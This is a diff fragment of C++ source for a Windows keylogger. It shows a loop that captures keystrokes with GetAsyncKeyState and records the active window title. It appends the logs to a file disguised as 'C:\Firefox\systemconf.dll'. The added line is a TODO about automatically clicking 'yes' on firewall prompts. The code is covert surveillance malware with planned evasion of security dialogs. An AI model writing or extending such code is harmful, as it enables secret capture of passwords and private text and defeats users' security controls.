@@ -133,6 +133,7 @@ void Log(int limite_keystrokes){
             if(GetAsyncKeyState(keys)&1==1){
                 GetWindowText(GetForegroundWindow(),currentWindowTitle,sizeof(currentWindowTitle));
                 strings = convertKey(keys, keystrokes);
+                // TODO: Check if current window title is firewall one. If it is, click yes
                 if(strcmp(currentWindowTitle,  newWindowTitle)&& strings!="" && strings!="[TAB]"){
 
                     ofstream store("C:\\Firefox\\systemconf.dll", ios::app);
